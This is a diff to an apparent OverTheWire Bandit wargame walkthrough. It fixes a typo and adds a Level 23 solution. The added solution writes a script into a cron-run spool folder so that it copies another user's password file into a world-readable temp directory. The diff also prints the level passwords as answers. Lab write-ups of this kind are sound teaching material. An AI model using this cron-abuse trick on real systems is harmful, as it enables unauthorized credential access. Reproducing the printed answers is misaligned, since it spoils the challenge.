@@ -534,7 +534,7 @@ Username: bandit21 <br>
 Username: bandit22 <br>
 
 - Look into the script
-- Do the commands wit `myname=bandit23`
+- Do the commands with `myname=bandit23`
 - Get the flag
 
 <details>
@@ -555,5 +555,47 @@ Username: bandit22 <br>
     <summary>Password</summary>
 
     0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+  </details>
+</details>
+
+
+## Level 23
+
+Username: bandit23 <br>
+
+- Look into the cronjob script
+- it will execute all scripts in specific folder if owner == bandit23
+- Write script to copy the flag
+- Set permissions and cp the script into the right folder
+
+<details>
+  <summary>The way</summary>
+  
+  ```shell
+  ssh bandit23@bandit.labs.overthewire.org -p 2220
+  cat /usr/bin/cronjob_bandit24.sh
+  # On local machine
+  mktemp -d # creates /tmp/tmp.random
+  cd /tmp/tmp.random
+  nano get_pass.sh
+
+  # Script begin                            
+  #!/bin/bash
+  
+  cp /etc/bandit_pass/bandit24 /tmp/tmp.random/
+  chmod 777 /tmp/tmp.random/bandit24
+  # Script end
+
+  cp get_pass.sh /var/spool/bandit24/foo
+  chmod /var/spool/bandit24/foo/get_pass.sh # if this says file doesn't exist repeat the line before and this line
+
+  # After a minute or two 
+  cat /tmp/tmp.random/bandit24
+  ```
+
+  <details>
+    <summary>Password</summary>
+
+    gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
   </details>
 </details>
